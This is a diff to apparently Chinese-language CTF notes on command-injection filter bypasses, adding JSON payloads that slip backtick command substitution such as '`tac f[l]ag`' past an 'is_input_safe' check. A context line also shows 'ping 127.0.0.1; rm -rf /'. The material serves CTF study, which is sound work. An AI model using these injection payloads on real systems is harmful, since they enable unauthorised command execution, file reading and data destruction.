@@ -110,6 +110,30 @@ ping 127.0.0.1; rm -rf /
 - 反斜線
     - `c\at fl\ag`
 
+```py
+'''
+is_input_safe
+'''
+json_to_send = '{"tenshi": "Ijichi Nijika", "bocchi": "Goto Hitor-"}'
+json_to_send = '{"bocchi": "Goto Hitor-"}'
+
+'''
+is_input_safe but not show anything in <pre> tag
+'''
+json_to_send = '{"tenshi": "Ijichi Nijika", %%"bocchi"%%: "Goto Hitor-"}'
+json_to_send = '{"tenshi": "Ijichi Nijika", %%"bocchi"%%```: "Goto Hitor-"'
+json_to_send = '{"tenshi": "Ijichi Nijika", %%"bocchi"%%```: "Goto Hitor-"'
+json_to_send = '{bocchi: "Goto Hitori"}'
+json_to_send = '{bocchi: Goto Hitori}'
+json_to_send = '{"bocchi": "Goto Hitor-"}'
+
+
+json_to_send = '''{"bocchi":"'`tac f[l]ag`'"}'''
+json_to_send = '''{"bocchi":"'`c\at fl\ag"}'''
+json_to_send = '''{"tenshi": "Ijichi Nijika", "bocchi":"'`tac f[l]ag`'"}'''
+json_to_send = '''{"bocchi":"'`tac f[l]ag`'"}'''
+```
+
 
 [^1]: [Command Injection#keyword 繞過](https://github.com/w181496/Web-CTF-Cheatsheet?tab=readme-ov-file#command-injection)
 
